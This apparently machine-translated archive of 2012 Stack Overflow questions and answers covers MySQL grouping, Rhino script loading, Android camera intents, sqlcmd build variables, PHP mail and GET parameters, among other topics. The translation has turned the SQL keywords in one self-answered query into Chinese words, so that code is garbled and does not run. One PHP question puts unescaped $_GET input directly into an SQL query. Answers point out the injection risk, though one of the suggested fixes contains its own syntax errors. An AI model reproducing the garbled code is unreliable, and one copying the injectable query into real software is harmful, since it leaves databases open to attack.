  select count(*) total, date(created_at) dt, actor_id
  from yourtable
  group by actor_id, date(created_at)
) t2
  on t1.actor_id = t2.actor_id
  and date(t1.created_at) = t2.dt
group by  t1.actor_id, date(t1.created_at)
order by t1.created_at desc 
```

# 请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!2/bcb18/17)

我正在`actor_id`使用该[`DATE()`](http://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_date)功能对日期和日期进行分组

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-18T09:26:44.577

我自己找到解决方案

这是查询

```
设置@i = 0；
选择
    COUNT(`wrapper`.`id`) AS 'count',
    GROUP_CONCAT(`wrapper`.`type` SEPARATOR ',') as 'types'
从 （
    选择  
        @prev := (
            选择 prev_te.actor_id
            FROM `timeline_events` 作为 prev_te
            在哪里 prev_te.created_at > te.created_at
            ORDER BY prev_te.created_at ASC
            限制 1
        ) 作为 'prev_actor_id',
        如果（
            @prev = te.`actor_id` 或 @prev 为 NULL，
            @一世，
            @i := @i + 1
        ) 作为 'actor_id_group',
        `te`.*
    FROM `timeline_events` 作为 te
    订购方式
        te.created_at DESC，
        te.id DESC
) 作为`包装器`
GROUP BY `wrapper`.`actor_id_group`
限制 10

```

这是[证明链接](http://sqlfiddle.com/#!2/a1c32/2);-)

[这个网站](http://www.artfulsoftware.com/infotree/queries.php)真的帮助了我

我使用包装器进行分组，因为mysql没有按变量分组，如果有人知道更好的解决方案，请告诉我

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:43:04.420

添加`GROUP BY actor_id`之前`order by`的子句。

最新编辑： `select distinct actor_id, count(actor_id), created_at from actors group by actor_id order by created_at desc;`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T14:43:59.683

> 选择 `te`。`id`, te.actor_id, te.created_at, te.updated_at , COUNT(*) FROM `timeline_events`AS te GROUP BY te.actor_id, te.created_at ORDER BY te.created_at DESC LIMIT 10

# json - 状态 200 正常，但没有使用 grails Web 服务呈现 json

> ID：12461646
> 
> 赞同：0
> 
> 时间：2012-09-17T14:39:47.917
> 
> 标签：json, web-services, grails, amazon-ec2

我正在使用 grails 生成 JSON 并生成 URL ..当我尝试访问 URL 时..它被连接..因为 STatus 出来是 200 ok 但没有响应..

任何人都知道如何解决这个问题..请帮助

谢谢..

使用 amazon ec-2 但它甚至不能在本地工作。所以问题仅在于 grails 映射。任何人都知道这里可能是什么问题..？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-19T09:25:41.173

我只需要将 html 文件保存在同一个文件夹下的同一台服务器中......工作正常......在它成为跨平台问题之前......

# rhino - 如何从嵌入式 Rhino 加载本地文件？

> ID：12461648
> 
> 赞同：0
> 
> 时间：2012-09-17T14:39:53.387
> 
> 标签：rhino, embedding

我正在使用 Rhino`context.evaluateString()`从 Java 内部运行一些简单的 JavaScript。[它是嵌入 Javascript 指南](https://developer.mozilla.org/en-US/docs/Rhino/Embedding_tutorial)中的教科书：

```
String script = // simple logic
Context c = new ContextFactory().enterContext();
ScriptableObject scope = context.initStandardObjects();
Object o = context.evaluateString(scope, script, "myScript", 1, null);
ScriptableObject result = Context.jsToJava(o, ScriptableObject.class); 
```

我不确定这是当前的最佳实践，因为主要的 Rhino 文档似乎已关闭，但到目前为止它正在工作。

我希望能够引用工作目录中的库——我看到[Rhino shell 支持`load`](https://developer.mozilla.org/en-US/docs/Rhino/Shell)，但我认为这在嵌入引擎中不起作用。

这可能吗？它在任何地方都有记录吗？理想情况下，我希望能够调用类似的东西`load('other.js')`并让它搜索我指定为全局属性的目录。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T15:39:17.137

我有一个我不太喜欢的答案，尤其是因为它暴露了我很确定是在过去半小时里让我发疯的 Rhino 错误：

```
eval("" + Packages.org.apache.commons.io.FileUtils.readFileToString(
  new java.io.File("/the/local/root", "script.js");
)); 
```

{ 这`"" + ...`就是我解决这个错误的方法——如果你`eval()`是一个 Java `String`（例如从`readFileToString`调用中返回）而不手动将它强制转换为 JavaScript 本机字符串，那么似乎什么也没有发生。通话只是默默地失败。}

这会盲目地读取一个任意文件并对其进行评估——当然，这是你`eval()`在 Java 方面所做的，所以我不太担心。

无论如何，由于多种原因，它并不优雅，但它确实*有效*。我很想听到更好的答案！

# android - 从 ftp 而非 http 解析 xml 文件

> ID：12461654
> 
> 赞同：1
> 
> 时间：2012-09-17T14:40:38.940
> 
> 标签：android, http, ftp, xml-parsing, joomla2.5

我正在构建 xml 解析器，并且正在使用这种方法：

```
String xml = "";
DefaultHttpClient httpClient = new DefaultHttpClient();
HttpPost httpPost = new HttpPost(url);
HttpResponse httpResponse = httpClient.execute(httpPost);
HttpEntity httpEntity = httpResponse.getEntity();
xml = EntityUtils.toString(httpEntity, HTTP.UTF_8); 
```

它将所有 xml 文件作为字符串。

但是当我将 xml 文件上传到主机（Joomla 的网络托管）时，我无法查看它或使用 http 访问 xml：

[http://www.mywebsite.com/myfile.xml](http://www.mywebsite.com/myfile.xml)

我只能使用 ftp 访问 xml 文件：

[ftp://mywebsite.com/myfile.xml](ftp://mywebsite.com/myfile.xml)

如何通过从 ftp 访问它来解析这个 xml 文件，或者如何允许从 http 访问 Joomla 网站上的文件？

# android - 无法保存使用本机相机应用程序拍摄的照片

> ID：12461667
> 
> 赞同：0
> 
> 时间：2012-09-17T14:41:24.847
> 
> 标签：android, android-intent, android-camera, runtimeexception

我正在尝试使用内置的相机应用程序，通过我自己的应用程序的意图调用它，在指定的位置拍照。我使用了大量来自[developer.android.com](http://developer.android.com/index.html)的示例代码，但它引发了异常：

```
java.lang.RuntimException: Failure delivering result ResultInfro(who=null, request=1, result=1, data=null). 
```

我检查了 SD 卡，但没有创建图像。我在这里阅读了很多主题，但没有一个对我有帮助。

我的代码：

```
Intent intent = new Intent("android.media.action.IMAGE_CAPTURE");
File mediaStorageDir = new File(Environment.getExternalStoragePublicDirectory(
              Environment.DIRECTORY_PICTURES), "MyCameraApp");

// Create the storage directory if it does not exist
if (! mediaStorageDir.exists()) {
    if (! mediaStorageDir.mkdirs()) {
        Log.d("MyCameraApp", "failed to create directory");
        return null;
    }
}

// Create a media file name
String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
File mediaFile;
mediaFile = new File(mediaStorageDir.getPath() + File.separator +
                     "IMG_"+ timeStamp + ".jpg");
Uri fileUri =  Uri.fromFile(getOutputMediaFile());
intent.putExtra(MediaStore.EXTRA_OUTPUT, fileUri);
startActivityForResult(intent, TAKE_PICTURE); 
```

我接下来要做什么：

```
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    switch (requestCode) {
    //taken photo
    case TAKE_PICTURE:
        if (resultCode == RESULT_OK) {
            // Image captured and saved to fileUri specified in the Intent
            Toast.makeText(this, "Image saved to:\n" +
                    data.getData(), Toast.LENGTH_LONG).show();
        } else if (resultCode == RESULT_CANCELED) {
            // User cancelled the image capture
        } else {
            // Image capture failed, advise user
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T22:57:45.440

这回答了一个非常相似的问题： [当我使用 ACTION_IMAGE_CAPTURE 拍照时出现 NullPointerException](https://stackoverflow.com/questions/3275749/im-getting-a-nullpointerexception-when-i-use-action-image-capture-to-take-a-pic)

最简单的解决方案是在启动活动时保留一个带有文件名的实例变量，并在 onActivityResult 期间从该实例变量加载文件名。

# sql-server - 如何在构建过程中管理特定于环境的值？

> ID：12461674
> 
> 赞同：1
> 
> 时间：2012-09-17T14:41:42.897
> 
> 标签：sql-server, build-process

我想自动化我维护的服务器实例的构建过程。在版本控制中，我有一个脚本，其中包含用于在生产环境中构建实例的每个命令和配置。

现在我想编写一个主构建脚本，将所有这些脚本应用于目标实例。

虽然我试图让我的开发环境尽可能像生产环境，但有些价值观总是不同的。为了处理这个问题，构建脚本应该接受特定于环境的值并将这些值传递给相关的构建步骤。

服务器实例有一个用户数据库。在生产中，用户数据库文件是在我的开发环境中不存在的驱动器上创建的，并且文件大于我在开发中的可用空间。

当我在生产中设置实例时，我使用了这个脚本。这是我目前在版本控制中的内容：

```
USE [master]
GO

CREATE DATABASE [QuoteProcessor] ON  PRIMARY (
  NAME = N'System_Data',
  FILENAME = N'G:\SQLData\QuoteProcessor\System_Data.mdf',
  SIZE = 500 MB,
  MAXSIZE = UNLIMITED,
  FILEGROWTH = 10%
),
FILEGROUP [DATA]  DEFAULT (
  NAME = N'QuoteProcessor_Data',
  FILENAME = N'G:\SQLData\QuoteProcessor\QuoteProcessor_Data.ndf',
  SIZE = 600 GB,
  MAXSIZE = UNLIMITED,
  FILEGROWTH = 10%
)
LOG ON (
  NAME = N'QuoteProcessor_Log',
  FILENAME = N'G:\SQLLogs\QuoteProcessor\QuoteProcessor_Log.ldf',
  SIZE = 100 GB,
  MAXSIZE = UNLIMITED,
  FILEGROWTH = 10%
);

ALTER DATABASE [QuoteProcessor] SET COMPATIBILITY_LEVEL = 100
GO

ALTER DATABASE [QuoteProcessor] SET ANSI_NULL_DEFAULT OFF 
GO

ALTER DATABASE [QuoteProcessor] SET ANSI_NULLS OFF 
GO

ALTER DATABASE [QuoteProcessor] SET ANSI_PADDING OFF 
GO

ALTER DATABASE [QuoteProcessor] SET ANSI_WARNINGS OFF 
GO

ALTER DATABASE [QuoteProcessor] SET ARITHABORT OFF 
GO

ALTER DATABASE [QuoteProcessor] SET AUTO_CLOSE OFF 
GO

ALTER DATABASE [QuoteProcessor] SET AUTO_CREATE_STATISTICS ON 
GO

ALTER DATABASE [QuoteProcessor] SET AUTO_SHRINK OFF 
GO

ALTER DATABASE [QuoteProcessor] SET AUTO_UPDATE_STATISTICS ON 
GO

ALTER DATABASE [QuoteProcessor] SET CURSOR_CLOSE_ON_COMMIT OFF 
GO

ALTER DATABASE [QuoteProcessor] SET CURSOR_DEFAULT  GLOBAL 
GO

ALTER DATABASE [QuoteProcessor] SET CONCAT_NULL_YIELDS_NULL OFF 
GO

ALTER DATABASE [QuoteProcessor] SET NUMERIC_ROUNDABORT OFF 
GO

ALTER DATABASE [QuoteProcessor] SET QUOTED_IDENTIFIER OFF 
GO

ALTER DATABASE [QuoteProcessor] SET RECURSIVE_TRIGGERS OFF 
GO

ALTER DATABASE [QuoteProcessor] SET  DISABLE_BROKER 
GO

ALTER DATABASE [QuoteProcessor] SET AUTO_UPDATE_STATISTICS_ASYNC OFF 
GO

ALTER DATABASE [QuoteProcessor] SET DATE_CORRELATION_OPTIMIZATION OFF 
GO

ALTER DATABASE [QuoteProcessor] SET TRUSTWORTHY OFF 
GO

ALTER DATABASE [QuoteProcessor] SET ALLOW_SNAPSHOT_ISOLATION OFF 
GO

ALTER DATABASE [QuoteProcessor] SET PARAMETERIZATION SIMPLE 
GO

ALTER DATABASE [QuoteProcessor] SET READ_COMMITTED_SNAPSHOT ON 
GO

ALTER DATABASE [QuoteProcessor] SET HONOR_BROKER_PRIORITY OFF 
GO

ALTER DATABASE [QuoteProcessor] SET RECOVERY SIMPLE 
GO

ALTER DATABASE [QuoteProcessor] SET  MULTI_USER 
GO

ALTER DATABASE [QuoteProcessor] SET PAGE_VERIFY CHECKSUM  
GO

ALTER DATABASE [QuoteProcessor] SET DB_CHAINING OFF 
GO

USE [master]
GO

ALTER DATABASE [QuoteProcessor] SET  READ_WRITE 
GO 
```

在开发环境中，我可以使用相同的文件组，但我必须为数据库文件使用不同的路径和不同的大小。

我看到了几个解决方案：

1.  为每个环境手动编辑脚本。我不能真正自动化这个，或者用它来跟踪环境特定值的变化。
2.  为每个环境制作一份脚本副本。我可以根据环境自动选择脚本。这将重复那些永远不应该独立改变的事物的规范，就像所有的`ALTER DATABASE`陈述一样。
3.  使用脚本变量抽象出特定于环境的值，并在另一个地方定义这些值，例如环境配置文件。

我认为选项 3 是最干净的解决方案。这是我在这里探索的。

例如，我可以使用 sqlcmd 脚本变量将 CREATE DATABASE 语句替换为：

```
CREATE DATABASE [QuoteProcessor] ON  PRIMARY (
  NAME = N'System_Data',
  FILENAME = N'$(PrimaryDataFileFullPath)',
  SIZE = $(PrimaryDataFileSize),
  MAXSIZE = UNLIMITED,
  FILEGROWTH = 10%
),
FILEGROUP [DATA]  DEFAULT (
  NAME = N'QuoteProcessor_Data',
  FILENAME = N'$(UserDataFileFullPath)',
  SIZE = $(UserDataFileSize),
  MAXSIZE = UNLIMITED,
  FILEGROWTH = 10%
)
LOG ON (
  NAME = N'QuoteProcessor_Log',
  FILENAME = N'$(LogFileFullPath)',
  SIZE = $(LogFileSize),
  MAXSIZE = UNLIMITED,
  FILEGROWTH = 10%
); 
```

为了在生产环境中创建数据库，我可以像这样调用脚本：

```
sqlcmd -i QuoteProcessor.sql -v PrimaryDataFileFullPath="G:\SQLData\QuoteProcessor\System_Data.mdf" -v PrimaryDataFileSize="500 MB" -v UserDataFileFullPath="G:\SQLData\QuoteProcessor\QuoteProcessor_Data.ndf" -v UserDataFileSize="600 GB" -v LogFileFullPath="G:\SQLLogs\QuoteProcessor\QuoteProcessor_Log.ldf" -v LogFileSize="100 GB" 
```

主构建脚本将从配置文件中读取值并将它们传递给 sqlcmd。

将有一个用于生产的配置文件，一个用于开发的配置文件；一个适用于我组织中的每个不同环境。

我还没有决定如何存储特定于环境的值，但我认为 INI 文件或 XML 文件会更容易。

其他人可以提供解决类似问题的建议吗？我不确定这是否是做我想做的最好的方法。是否有一种更简单或更受支持的方法来管理此问题的特定于环境的值？我应该使用一些工具来为我管理这种事情吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T16:07:38.833

这只是我对这些的看法

> 1\. 为每个环境手动编辑脚本。我不能真正自动化这个，或者用它来跟踪环境特定值的变化。

我建议不要这样做。这允许人们意外地更改您不打算让他们接触的代码。并不是说其他​​人会阻止它，但这会带来最大的风险。

> 2\. 为每个环境制作一份脚本副本。我可以根据环境自动选择脚本。这将复制永远不应该独立改变的事物的规范，就像所有的 ALTER DATABASE 语句一样。

这可行，但是当服务器更改时您会遇到问题，并且根据您确定什么是开发服务器或产品服务器的标准，该脚本可能已过时。

> 3\. 使用脚本变量抽象出特定于环境的值，并在另一个地方定义这些值，例如环境配置文件。

这就是[SSDT](http://msdn.microsoft.com/en-us/data/tools.aspx)和 microsoft sql server 数据工具项目的做法。

还有一种混合方法，您可以通过使用模板参数（至少在 sql server 中再次）抽象出环境特定值但没有环境配置文件

[http://msdn.microsoft.com/en-us/library/hh230912.aspx](http://msdn.microsoft.com/en-us/library/hh230912.aspx)

# php - SEO cookie 重定向

> ID：12461677
> 
> 赞同：-1
> 
> 时间：2012-09-17T14:41:55.710
> 
> 标签：php, redirect, seo, web-crawler, session-cookies

我有一个网站，我将流量分成两个用户组“学习者”和“教师”。我将他们的用户组保存在会话变量中，并将他们引导到他们网站的相关部分。

由于搜索引擎没有设置 user_type cookie，我遇到了搜索引擎无法索引该网站的问题。有没有一种方法可以让搜索引擎爬虫访问网站的两个部分（目前它陷入从 user_type 选择页面到主页的循环中）。

理想情况下，我还希望能够允许爬虫访问仅限会员的资源，因为学习驱动程序将能够访问我希望只有在登录后才能访问的内容。

检查会话变量 user_type 的代码在下面，并在每个页面上调用（因此为什么没有抓取任何内容）

```
 if($check_exists==TRUE) {
        $this->session->set_userdata('referrer', current_url());
        if (strlen($this->session->userdata('user_type'))==0) {
            redirect('/user_type/');
        }
    } else if($check_exists==FALSE) {
        if (strlen($this->session->userdata('user_type'))>0) {
            redirect('/home/');
        }
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T15:43:10.683

从 SEO 的角度来看，您用来处理两种用户类型（学习者和教师）的概念是错误的。在大多数情况下，您永远不必让不同的内容共享一个 URL。

在您的情况下，如果未找到 cookie ， [http:](http://www.road2driving.co.uk/home) //www.road2driving.co.uk/home 将重定向到[http://www.road2driving.co.uk/user_type 。](http://www.road2driving.co.uk/user_type)网络爬虫将忽略您的 cookie，并陷入循环。如果您想为这两个页面编制索引，则需要删除基于 cookie 的导航并创建站点的 2 个单独部分。

[http://www.road2driving.co.uk/home](http://www.road2driving.co.uk/home)应该是您当前的[http://www.road2driving.co.uk/user_type](http://www.road2driving.co.uk/user_type)页面。这意味着 /home 将为学习者和教师部分显示 2 个链接。

然后创建一个`learn`部分和一个`teach`部分，例如使用子文件夹。你将会有：

*   [http://www.road2driving.co.uk/home](http://www.road2driving.co.uk/home)
*   [http://www.road2driving.co.uk/learn/](http://www.road2driving.co.uk/learn/)
*   [http://www.road2driving.co.uk/teach/](http://www.road2driving.co.uk/teach/)

这样，爬虫就可以访问您网站的所有部分。

# github - github文件未提交

> ID：12461682
> 
> 赞同：2
> 
> 时间：2012-09-17T14:42:10.510
> 
> 标签：github

我是 GitHub 的新手，但我按照以下步骤创建了一个 repo：

```
$ mkdir fb
$ cd fb 
$ git init 
$ git add README 
$ git commit -m 'first commit'
$ git push origin master 
```

现在，当我尝试进行第一次提交时，出现以下错误：

```
$ git push origin master
error: Cannot access URL https://github.com/xxx/yyy/, return code 60
error: failed to push some refs to 'https://github.com/xxx/yyy' 
```

我正在使用最新的 git 版本。为什么 GitHub 会抛出这个异常错误，我该如何解决？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T15:57:39.550

如果您尝试在 git 存储库中使用 SSH 协议，例如`git@github.com:xxx/yyy.git`，看看这是否适合您，会怎样？

`$ git remote rm origin`

`$ git remote add origin git@github.com:xxx/yyy.git`

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-17T14:50:05.627

我相信返回错误代码与 SSL 证书有关……很抱歉，我无法提供进一步的帮助。

# iphone - AVPlayer 不会在 iPhone 上的 endinterruption 时恢复播放，但在 iPad 上会这样做

> ID：12461691
> 
> 赞同：3
> 
> 时间：2012-09-17T14:42:39.373
> 
> 标签：iphone, ios, avplayer, avaudiosession

我正在为 iPhone 和 iPad 编写一个广播应用程序，并且在处理暂停和播放音频时遇到了一些奇怪的行为。我正在使用 AVAudioSessionDelegate 方法`beginInterruption`和`endInterruption`来分别`pause`和`play`AVPlayer。下面是相关`play`代码。

现在，以下情况似乎一直在发生：

1.  **在 iPad 上：**如果我强制中断（Facetime 通话），`beginInterruption`按预期调用并停止播放。如果中断停止，`endInterruption`则按预期调用，并按预期恢复播放。
2.  **在 iPhone 上：**按下播放和暂停按钮，触发和`pause`会`play`完全一样。播放按预期进行。`beginInterruption``endInterruption`
3.  **在 iPhone 上：**强制中断（通过拨打电话）、按预期通话`endInterruption`和按预期暂停播放。但是，当中断结束时，`beginInterruption`按预期`play`调用，按预期调用，*它实际上到达并执行该`[self.player play]`行*，但播放**不恢复！**我什么也没听到。

上面的情况 3 非常奇怪，所以我想知道我是否忽略了一些东西。有任何想法吗？

**`Play`代码**

```
- (void)play { 
NSError* error = nil;
AVKeyValueStatus keyStatus = [currentAsset statusOfValueForKey:@"tracks" error:&error];
if(error){
    DLog(@"Error %@", [error localizedDescription]);
}
else {
    DLog(@"Current Key Status: %i", keyStatus);
    if(keyStatus == AVKeyValueStatusLoaded){
        DLog(@"Continue playing source: %@", self.source);
        [[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryPlayback error:&error];
        if (error) {
            DLog(@"Error during play while setting AVAudioSessionCategory: %@", [error localizedDescription]);
        }
        [[AVAudioSession sharedInstance] setActive:YES error:&error];
        if (error) {
            DLog(@"Error during play while setting AVAudioSessionCategory: %@", [error localizedDescription]);
        }
        [[AVAudioSession sharedInstance] setDelegate:self];
        if(backgroundTaskID != UIBackgroundTaskInvalid){
            [[UIApplication sharedApplication] endBackgroundTask:backgroundTaskID];
        }
        backgroundTaskID = [[UIApplication sharedApplication] beginBackgroundTaskWithExpirationHandler:NULL];

        [self.player play];
        [self setStatus:kNPOMediaPlayerStatusPlaying];
    }
    else {
        DLog(@"PlaySource: %@", self.source);
        [self playSource:self.source];
    }
}} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-21T20:36:33.397

我遇到过同样的问题。在我实施远程控制事件处理后问题消失了。我`[[UIApplication sharedApplication] beginReceivingRemoteControlEvents];`在开始播放时打电话。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T13:03:05.547

事实证明，这是 iOS 中的一个已知错误，它需要在 applicationDidBecomeActive 中进行一些仔细的工作来处理 beginInterruption。可悲的是，我想不出另一种解决方案。

# email - 警告：mail()：接收失败

> ID：12461692
> 
> 赞同：2
> 
> 时间：2012-09-17T14:42:40.107
> 
> 标签：email, smtp, php

我正在尝试通过 ii7 在我的 Windows 服务器上使用 php 邮件功能，并且我正在升温，这不允许我发送邮件。

```
Warning: mail(): Failed to Receive in xxx 
```

该行包含以下内容：

```
mail("mail@myserver.com", "subject", 'body',"From: mail2@myserver.com") 
```

在 php.ini 我已经配置了 SMTP 服务器、端口和 sendmail_from，如下所示：

```
; http://php.net/smtp
SMTP = 128.x.x.xxx
; http://php.net/smtp-port
smtp_port = 110

; For Win32 only.
; http://php.net/sendmail-from
sendmail_from = mymail@myserver.com 
```

**phpinfo** () 安全模式为**Off**。

可能是什么问题？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:57:38.267

`110`是 POP3 端口，而不是 SMTP。试试`smtp_port = 25`吧。

# api - 如何使用 ImageJ API 为图像着色

> ID：12461693
> 
> 赞同：0
> 
> 时间：2012-09-17T14:42:39.430
> 
> 标签：api, imagej

我是 ImageJ 的新手，我正在寻求使用 ImageJ 的编程 API 为图像着色。

*   是否可以？如果有怎么办？
*   关于使用 ImageJ 进行图像着色的相关文档/Javadocs 在哪里？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T02:34:20.940

# java - java将LinkedHashMap转换为扩展LinkedHashMap的类

> ID：12461695
> 
> 赞同：2
> 
> 时间：2012-09-17T14:42:56.157
> 
> 标签：java, casting, hashmap, linkedhashmap

我有一个扩展 LinkedHashMap 的类（EntireFile）。我尝试投射：

```
EntireFile old = (EntireFile) functionReturningLinkedHashMap(); 
```

它抛出异常消息：“java.util.LinkedHashMap 无法转换为 com.gmail.maximsmol.YAML.GroupMap”。

```
public class EntireFile extends LinkedHashMap<String, GroupMap>

public class GroupMap extends LinkedHashMap<String, CategoryMap>

public class CategoryMap extends LinkedHashMap<String, LinkedHashMap<String, Integer>> 
```

请帮我解决错误！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T14:45:34.300

问题是返回的引用根本*不是*对`EntireFile`. 如果`functionReturningLinkedHashMap`只返回 a `LinkedHashMap`，则不能将其强制转换为 a `EntireFile`，因为它*不是*一个 - 它如何获得有关它的任何额外信息？

（从您的例外情况来看，您实际上是在谈论`GroupMap`而不是`EntireFile`，但同样适用。）

这里没有什么特别之处`LinkedHashMap`——在 Java中*总是如此：*

```
Object foo = new Object();
String bar = (String) foo; // Bang! Exception 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:55:45.280

您可以将数据复制到所需的地图类型，而不是强制转换。

```
EntireFile old = new EntireFile(functionReturningLinkedHashMap()); 
```

或者

```
EntireFile old = new EntireFile();
old.putAll(functionReturningLinkedHashMap()); 
```

# wcf - 使用 .net 对 Web 服务进行单元测试

> ID：12461697
> 
> 赞同：1
> 
> 时间：2012-09-17T14:43:05.007
> 
> 标签：wcf, web-services, load-testing

我有一个 web 服务的 wcf .net 客户端。我正在努力确保与此 Web 服务的连接是稳固的，并且 Web 服务本身是坚固的并且可以站立并承受冲击。我希望用 50 个不同的异步调用来实现它，以确保它运行良好。有没有办法可以使用 .net 框架对 web 服务进行多次异步调用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:58:35.490

如果您使用的是 VS 2012，则可以使用[内置的负载测试](http://blogs.msdn.com/b/visualstudioalm/archive/2012/06/04/getting-started-with-load-testing-in-visual-studio-2012.aspx)

您还可以使用[LoadUI等免费工具](http://www.loadui.org/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T16:23:58.143

Visual Studio 2010（测试版或旗舰版）对性能和负载测试具有出色的支持（具有大量可扩展点来满足您的需求）。查看以下博客以获取与负载和 Web 性能测试相关的一系列链接：

[http://blogs.msdn.com/b/edglas/archive/2007/12/17/content-index-for-web-tests-and-load-tests.aspx](http://blogs.msdn.com/b/edglas/archive/2007/12/17/content-index-for-web-tests-and-load-tests.aspx)

一个好的方法是使用 fiddler 记录应用程序和服务之间的流量，然后将其导出到 Web 性能测试中。

# java - cdi 对话在哪个 JSF 阶段开始？

> ID：12461698
> 
> 赞同：2
> 
> 时间：2012-09-17T14:43:06.423
> 
> 标签：java, jsp, cdi

在 JSF 阶段，临时 CDI 对话被提升为长期对话。我假设这发生在调用应用程序阶段，因为这是可以调用 Conversation.begin() 方法的地方。

我希望实现一种机制来开始在 JSP 阶段侦听器中开始对话。通过将某些视图 ID 配置为对话的起点。因此，在 JSF 侦听器中，如果当前视图 ID 与配置的视图 ID 相同，我希望能够检查是否需要启动对话。有点类似于 pages.xml 中的对话开始标签，这是 seam 3 中不存在的功能。

# sql - SQL Server 2008 - 使用合并作为更大查询的一部分的逗号分隔

> ID：12461700
> 
> 赞同：0
> 
> 时间：2012-09-17T14:43:06.970
> 
> 标签：sql, sql-server-2008, coalesce

我正在使用 coalesce 返回一串名称，当我将它作为单个查询运行时，我没有问题，但是当我想将它放在更大的查询中时，我有点难过。

以下是有效的部分：

```
DECLARE @return varchar(200)

SELECT @return = COALESCE(@return + ', ', '') +
                 CAST((select FileAs) AS varchar(30))
from Objects
where ObjectId in (select objectid from  dbo.Get_XML_Links(2335))
select @return 
```

但我想将名称列表添加到更大的查询中，如下所示：

```
select  det.Description,
        StartTime, 
        EndTime,
        THE STRING OF NAMES

from DiaryEvents de
inner join DiaryEventTypes det on det.DiaryEventTypeID = de.EventTypeID
where EventTypeID in (29,40) 
```

我不太清楚我需要做什么（或者是否可以采用这种格式！）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T15:44:46.817

感谢上面的评论和一篇关于[SQL Authority](http://blog.sqlauthority.com/2009/11/25/sql-server-comma-separated-values-csv-from-table-column/ "SQL 授权")的非常方便的文章，我已经完成了如下工作：

```
select  det.Description,
        StartTime, 
        EndTime, 
        (
        SELECT SUBSTRING(
        (select ',' + FileAs
        from Objects
        where ObjectId in (select objectid from dbo.Get_XML_Links(de.diaryeventid) where ObjectTypeSystemCode = 'CCT')
        FOR XML PATH('')),2,200000) 
        )AS Contacts

from DiaryEvents de
inner join DiaryEventTypes det on det.DiaryEventTypeID = de.EventTypeID
where EventTypeID in (29,40) 
```

# php - 从链接获取变量的问题

> ID：12461701
> 
> 赞同：0
> 
> 时间：2012-09-17T14:43:08.373
> 
> 标签：php

我有这段代码允许我将变量传递到另一个页面，但问题是我似乎无法使用链接获取该变量。我们以前尝试过，同样的方法并且有效..你能检查一下吗？

谢谢..

链接：

```
$sql="SELECT * FROM pianificazione";
$query = mysql_query($sql);
while ($row = mysql_fetch_array($query)) {
?>
<a href="lista_attivita.php?&id=<?php echo $row['job_id'] ; ?>"><?php echo $row['job'] ?></a>
<?php echo '</br><br />'; }
?> 
```

链接后的页面：

```
include('menu.php');
$id=$_GET['job_id'];
$sql="SELECT * FROM attivita WHERE job_id='$id'";
$query = mysql_query($sql);
while ($row = mysql_fetch_array($query)) {
?>
<a href="lista_attivita.php?&id=<?php echo $row['att_id'] ?>"><?php echo $row['attivita_da_promuovere'] ?>-<?php echo $row['attivita_tip_merc'] ?>-<?php echo $row['attivita_da_svolgere'] ?>-<?php echo $row['attivita_tip_personale'] ?></a> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:44:05.303

你应该使用：

```
$id = $_GET['id']; 
```

您也对 SQL 注入持开放态度......要么将其解析为 INT：

```
$id = (int) $_GET['id']; 
```

...或使用[PDO](http://php.net/manual/en/book.pdo.php)准备好的语句（而不是您正在使用的默认 mysql 函数，不再推荐）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:44:30.433

您将其传递为：

```
lista_attivita.php?&id=<?php echo $row['job_id'] ; ?> 
```

然后寻找它：

```
$id=$_GET['job_id']; 
```

你应该使用：

```
$id=$_GET['id']; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:45:18.757

在您传递给“链接后页面”的 URL 中，您将“？id = xxx”设置为参数，但是在您的脚本中，您正在寻找“job_id”。

在您的第一个脚本中将参数更改为 ?job_id=。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T14:48:45.143

两件事情。

1) **功能性**

```
$id=$_GET['job_id']; 
```

应该

```
$id=$_GET['id']; 
```

因为您的链接传递变量 id，而不是 job_id：

```
lista_attivita.php?&**id**=<?php echo $row['job_id'] 
```

2) **安全**

永远，永远不要将用户输入的数据直接插入到 SQL 查询中。你问的是头痛或更糟。在进行任何查找之前，应验证并转义接收页面上的 $id。如果您需要一个数字，请在接收页面上执行以下操作：

```
if (!is_numeric($_GET['id']))
{
// throw error
} 
```

查询您的数据库以获取有效代码并不是一个坏主意，将它们放入一个数组中，然后检查该数组以查看是否找到传递的值。这可以防止用户输入的数据到达您的数据库。

像这样的东西：

```
$q = "SELECT DISTINCT(id) FROM my_table WHERE display=1 ORDER BY id ASC";
$res = mysqli_query($dbx,$q);
while (list($_id) = mysqli_fetch_array)
{
  $arr_valid_id[] = $_id;
} 
```

然后，

```
if (in_array($_GET[id],$arr_valid_id[])
{
// do stuff
} else {
// throw error
} 
```

# windows-phone-7 - 在 WP7 SQL Server CE 数据库上更改密码

> ID：12461703
> 
> 赞同：1
> 
> 时间：2012-09-17T14:43:13.750
> 
